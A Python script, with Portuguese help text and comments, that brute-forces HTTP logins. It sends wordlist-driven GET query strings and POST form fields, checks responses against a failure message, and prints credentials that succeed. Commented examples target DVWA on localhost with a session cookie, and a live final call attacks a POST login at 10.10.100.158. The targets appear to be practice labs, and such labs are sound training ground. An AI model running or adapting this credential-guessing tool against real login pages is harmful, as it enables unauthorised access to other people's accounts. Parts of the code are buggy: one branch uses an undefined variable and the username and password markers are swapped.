# from bs4 import BeautifulSoup
import requests
import re
import sys
import getopt
from collections import deque

def uso_http_get():
    print("")
    print("Comandos:")
    print("")
    print('-h, --help             : help')
    print("-u, --url              : url do alvo")
    print("-w, --wordlist         : caminho da wordlist")
    print("-b, --body             : informações da requisição")
    print("-t, --cookies          : cookies")
    print("-t, --type             : tipo do brute force")
    print("-v, --validator        : tipo do brute force")
    print("")   
    print(f"EX: python {__file__} -t get -u 'http://127.0.0.1/dvwa/login.php/brute.php' -w path_wordlist -c 'cookies' -b '?username=$&password=$&Login=Login#' -v 'Username and/or password incorrect.' ")
    print("")

def formatar_dicionario(string,separator):
    string = {j[0]:j[1] for j in [i.split("=") for i in string.strip().split(separator)]}
    return string

def send_get(url,credential,validator,cookies=None):
    try:
        if cookies is not None:response = requests.get(url,allow_redirects=True,cookies=formatar_dicionario(cookies,";"))
        else: response = requests.get(url,allow_redirects=True)
        if validator not in response.text:
            print(response.status_code,credential)
    except Exception as e:
        print(e)

def http_get_handler(url,body,wordlist,validator,cookies):
    try: 
        cred1 = ''
        cred2 = ''
        cont = body.count("$")
        if cont >= 1:
            with open(wordlist,'r') as file:
                linhas = file.readlines()
                for linha in linhas:
                    cred1 = linha
                    body_to_send_1 = body.replace("$",linha.strip(),1)
                    if cont > 1:
                        with open(wordlist,'r') as file2:
                            linhas2 = file2.readlines()
                            for linha2 in linhas2:
                                cred2 = linha2
                                body_to_send_2 = body_to_send_1.replace("$",linha2.strip(),1)
                                string = url + body_to_send_2
                                send_get(string,[cred1,cred2],validator,cookies)
                    else: send_get(string,[cred1],validator,cookies)
                            # send_get(string,[cred1,cred2],cookies)

        elif body.count("$") == 2:
            pass
        else:
            raise ValueError("O caractere '$' não foi encontrado no texto.")
    except Exception as e:
        print(e)

# try:
#     opts,args = getopt.getopt(sys[1:],'u:w:b:c:v:', ['--url=','--wordlist=','--body=','--cookies=','--validator='])
#     url = None
#     body = None
#     wordlist = None
#     cookies = False
#     validator = None
    
#     for a,i in opts:
#         if a in('-u','--url'):
#             url = i
#         elif a in ('-w','--wordlist'):
#             wordlist = i
#         elif a in ('-b','--body'):
#             body = i
#         elif a in ('-c','--cookies'):
#             cookies = i
#         elif a in ('-v','--validator'):
#             validator = i
#         else:
#             raise getopt.GetoptError("Argumentos inválidos")
#     for i in [url,body,wordlist,validator,cookies]:
#         if i is None:
#             raise getopt.GetoptError("Argumentos inválidos")
#     http_get_handler(url,body,wordlist,validator,cookies)
# except Exception as e:
#     print(e)
#     uso_http_get()

# url = "http://127.0.0.1/dvwa/vulnerabilities/brute/"
# get_body = "?username=$&password=$&Login=Login#"
# cookies = "security=low; PHPSESSID=jkp318n6lq4gp89v92f46dshad"
# wordlist = "teste.txt"
# validator = "Username and/or password incorrect."   
# http_get_handler(url,get_body,wordlist,validator,cookies)

def formart_cookies_post(cookies):
    cookies_dict = {}
    cookies = cookies.split(';')

    for cookie in cookies:
        key,value = cookie.split('=')
    
        if key=="" or value=="":
            print("Valore de cookie inválidos")
            return dict()
    
        cookies_dict.update({key:value})
    
    return cookies_dict

def format_post_data(post_string):
    post_dict = {}

    post_list = post_string.split('&')
    for i in post_list:
        key,value = i.split('=')
        
        if key == "" or value == "":
            return dict()
        
        post_dict.update({key:value})
    
    return post_dict

def loged(response,string):
    if string in response:
        return False
    else:
        return True

def search_keys(information,search):
    for key in information.keys():
        if information[key] == search:
            return key

def send_post(hostname,information,validation,cookies):
    r = requests.post(url=hostname,data=information,cookies=cookies)
    if loged(r.text,validation):
        for i in information.keys():
            print( f'{i} : {information[i]}')
        return True
    return False

def http_post_brute_force(hostname,information,validation,wordlist_user=None,wordlist_passwd=None,cookies=None):
    keys_to_change = []
    list_user = deque()
    list_passwd = deque()
    threading = []
    information = format_post_data(information)
    
    if cookies is not None:
        cookies = formart_cookies_post(cookies)
        
        if not cookies:
            print("Valor inválido para os dados dos cookies")
            return -1
    else:
        cookies = dict()   
    
    keys_to_change.append(search_keys(information,"^USER"))
    keys_to_change.append(search_keys(information,"^PASS"))

    if wordlist_user is not None:
        with open(wordlist_user,"r",errors="ignore") as file:
            for linha in file:
                list_user.append(linha.strip())
        
    if wordlist_passwd is not None:
        with open(wordlist_passwd,"r",errors="ignore") as file:
            for linha in file:
                list_passwd.append(linha.strip())
                
    try:
        if list_user is not None:
            for linha_user in list_user:
                information.update({keys_to_change[0]:linha_user})
                if list_passwd is not None:
                    for linha_password in list_passwd:
                        information.update({keys_to_change[1]:linha_password})
                        if send_post(hostname,information,validation,cookies):
                            return 0
                else: 
                    if send_post(hostname,information,validation,cookies):
                            return 0
        else:
            for linha_password in list_passwd:
                information.update({keys_to_change[1]:linha_password})
                if send_post(hostname,information,validation,cookies):
                    return 0
    except TimeoutError as e:
        print(e) 
    except Exception as e:
        print(e) 
        return -1               
            
http_post_brute_force("http://10.10.100.158","username=^PASS&password=^USER",validation="Invalid username and password.",wordlist_user="brute_forcing/usernames.txt",wordlist_passwd="brute_forcing/usernames.txt")